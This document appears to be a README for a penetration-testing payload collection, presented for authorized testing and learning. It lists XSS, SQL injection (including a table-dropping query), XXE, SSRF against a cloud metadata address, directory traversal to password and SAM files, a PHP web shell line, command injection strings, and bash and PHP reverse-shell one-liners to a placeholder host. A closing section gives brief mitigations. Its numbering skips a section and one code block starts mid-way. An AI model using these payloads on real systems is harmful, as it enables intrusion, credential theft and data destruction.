<script>alert('XSS');</script>
<img src=x onerror=alert(1)>
"><svg onload=alert('XSS')>
```

---

### 2. **Directory Traversal Payloads**
Payloads to test for directory traversal vulnerabilities that allow unauthorized access to restricted files.

Examples:
```bash
../../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

### 3. **File Extensions Wordlist**
A comprehensive list of file extensions commonly exploited in file upload or download vulnerabilities.

Examples:
```
.php
.jsp
.asp
.phtml
```

---

### 4. **HTML Injection Payloads**
Payloads to inject arbitrary HTML content into vulnerable web applications.

Examples:
```html
<h1>Injected Heading</h1>
<a href="javascript:alert('HTML Injection')">Click Me</a>
```

---

### 5. **HTML Injection Read File Payloads**
Payloads crafted to exploit vulnerabilities that allow reading files via HTML injection.

Example:
```html
<iframe src="file:///etc/passwd"></iframe>
```

---

### 6. **IP Header Manipulation**
Payloads to test vulnerabilities relying on client-supplied headers for authentication or logging.

Examples:
```
X-Forwarded-For: 127.0.0.1
Client-IP: 127.0.0.1
```

---

### 7. **Linux Log Files**
A list of critical Linux log files for auditing and testing log-based vulnerabilities.

- `/root/.bash_history`

---

### 9. **Media Type (MIME) Testing**
A list of MIME types to test server handling of file uploads and downloads.

Examples:
```
application/javascript
text/html
image/svg+xml
```

---

### 10. **One-Liner Reverse Shells**
Pre-built one-liner payloads to establish reverse shells for testing post-exploitation scenarios.

Examples:
```bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

### 11. **OS Command Injection Payloads**

$(id)
```

#### Windows Payloads
Payloads for testing OS command injection vulnerabilities on Windows systems.
```cmd
& whoami
| dir
```

---

### 12. **PHP Code Injection Payloads**
Payloads to test PHP code injection vulnerabilities.
```php
<?php system($_GET['cmd']); ?>
```

---

### 13. **Server-Side Request Forgery (SSRF) Payloads**
Payloads to test SSRF vulnerabilities by exploiting server-side HTTP requests.

Examples:
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/
```

---

### 14. **SQL Injection Payloads**
#### Auth Bypass Payloads
```sql
' OR '1'='1' --
admin' --
```

#### General SQLi Payloads
```sql
' UNION SELECT NULL, NULL --
' OR 1=1 --
```

#### SQLi Query Join and Break Payloads
```sql
'; DROP TABLE users; --
' UNION SELECT user, password FROM users --
```

---

### 15. **Windows Log Files**
Critical Windows log file paths for auditing and testing.

Examples:
- `C:\Windows\System32\winevt\Logs\Security.evtx`
- `C:\Windows\System32\winevt\Logs\Application.evtx`

---

### 16. **Windows Sensitive Files**
A list of sensitive files and directories in Windows systems.

Examples:
- `C:\Windows\System32\config\SAM`
- `C:\Users\<username>\AppData\Local\Microsoft\Credentials`

---

### 17. **XML External Entity (XXE) Payloads**
Payloads for testing XML external entity injection vulnerabilities.

Examples:
```xml
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

---

## üí° Usage

1. **Testing**: Use the provided payloads in authorized environments to identify vulnerabilities.
2. **Learning**: Understand how these vulnerabilities work and the impact they can have.
3. **Development**: Build secure systems by understanding and mitigating these attack vectors.

---

## üõ†Ô∏è Mitigation Techniques

- **Input Validation**: Sanitize and validate all user inputs.
- **Parameterized Queries**: Use prepared statements for database interactions.
- **CSP**: Implement Content Security Policies to prevent XSS.
- **Access Control**: Restrict access to sensitive files and directories.
- **Logs**: Secure log files and monitor them for anomalies.
